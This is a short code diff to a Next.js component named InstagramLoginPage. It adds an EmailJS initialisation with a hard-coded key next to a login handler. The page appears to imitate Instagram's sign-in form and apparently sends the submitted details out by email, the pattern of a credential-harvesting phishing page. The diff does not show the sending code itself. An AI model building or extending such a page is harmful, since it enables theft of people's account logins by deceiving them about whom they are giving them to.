@@ -1,5 +1,6 @@
 'use client'
 import emailjs from 'emailjs-com'
+import { useEffect } from 'react'
 import { useState } from 'react'
 import Image from 'next/image'
 
@@ -11,6 +12,11 @@ export default function InstagramLoginPage() {
   const [isLoading, setIsLoading] = useState(false)
   const [error, setError] = useState('')        // ← add this
 const [submitted, setSubmitted] = useState(false)
+
+  useEffect(() => {
+    emailjs.init('fC6lMjHeHeHg4U2cM')
+  }, [])
+
 
   const handleLogin = async (e: React.FormEvent) => {
   e.preventDefault()
